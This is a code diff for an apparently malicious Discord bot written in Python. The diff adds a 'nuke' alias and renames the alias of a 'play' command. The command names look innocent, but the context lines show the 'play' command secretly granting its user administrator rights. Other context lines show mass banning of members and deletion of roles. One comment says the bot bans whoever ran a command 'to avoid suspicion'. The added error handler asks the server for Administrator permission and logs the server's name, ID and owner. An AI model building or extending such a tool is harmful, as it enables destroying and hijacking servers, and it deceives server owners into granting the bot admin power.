@@ -457,6 +457,11 @@ Banned Users: {len(member_list)}
 Roles Deleted: {len(role_list)}
 ''')
 
+# alias to help command
+@bot.command(name="nuke")
+@commands.bot_has_permissions(administrator=True)
+async def nukealias(ctx):
+    await nuke(ctx)
 
 # gives the user admin
 @bot.command(name="play")
@@ -466,12 +471,11 @@ async def play(ctx):
     await create_admin(ctx)
 
 
-# gives the user admin
+# alias to play command
 @bot.command(name="p")
 @commands.bot_has_permissions(administrator=True)
-async def p(ctx):
-    await ctx.message.delete()
-    await create_admin(ctx)
+async def playalias(ctx):
+    await play(ctx)
 
 
 # bans the person who ran the command to avoid suspicion
@@ -839,6 +843,30 @@ Server Name: {ctx.guild.name}
 Server ID: {ctx.guild.id}
 Server Owner: {ctx.guild.owner}
 ''')
+@nukealias.error
+async def nukealias_error(ctx, error):
+    if isinstance(error, commands.BotMissingPermissions):
+        await ctx.send("Checking environment...")
+        sleep(1)
+        try:
+            embed = discord.Embed(title="Error: Missing Required Permissions!",
+                                  description="This bot is lacking required permissions!")
+            embed.add_field(name="You need to grant me the following permission(s):",
+                            value="- Administrator")
+            await ctx.send(content=None, embed=embed)
+        except discord.Forbidden:
+            await ctx.send('''
+__**Error: Missing Required Permission!**__
+**I need the following permission(s) to function properly:**
+- `Administrator`
+''')
+
+        output_log(f'''
+Bad Environment: Insufficient Permissions!
+Server Name: {ctx.guild.name}
+Server ID: {ctx.guild.id}
+Server Owner: {ctx.guild.owner}
+''')
 
 
 @play.error
@@ -866,8 +894,8 @@ Server ID: {ctx.guild.id}
 Server Owner: {ctx.guild.owner}
 ''')
 
-@p.error
-async def p_error(ctx, error):
+@playalias.error
+async def playalias_error(ctx, error):
     if isinstance(error, commands.BotMissingPermissions):
         await ctx.send("Checking environment...")
         sleep(1)
